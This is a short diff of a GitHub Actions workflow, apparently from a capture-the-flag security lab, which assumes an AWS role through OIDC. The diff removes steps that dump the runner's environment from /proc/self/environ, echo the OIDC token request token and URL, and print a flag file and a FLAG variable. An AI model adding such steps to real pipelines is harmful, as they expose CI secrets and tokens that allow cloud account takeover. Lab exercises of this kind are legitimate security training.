@@ -20,18 +20,3 @@ jobs:
           aws-region: us-east-1
           role-to-assume: arn:aws:iam::337909758621:role/whitebox-lab-2-github-actions-role
           role-session-name: OIDCSession
-
-      - name: Get keys if possible
-        run: |
-          cat /proc/self/environ
-
-      - name: Print OIDC token
-        run: |
-          echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN
-          echo $ACTIONS_ID_TOKEN_REQUEST_URL
-
-      - name: Display flag file content
-        run: cat flag.txt
-
-      - name: Display environment variable FLAG
-        run: echo $FLAG
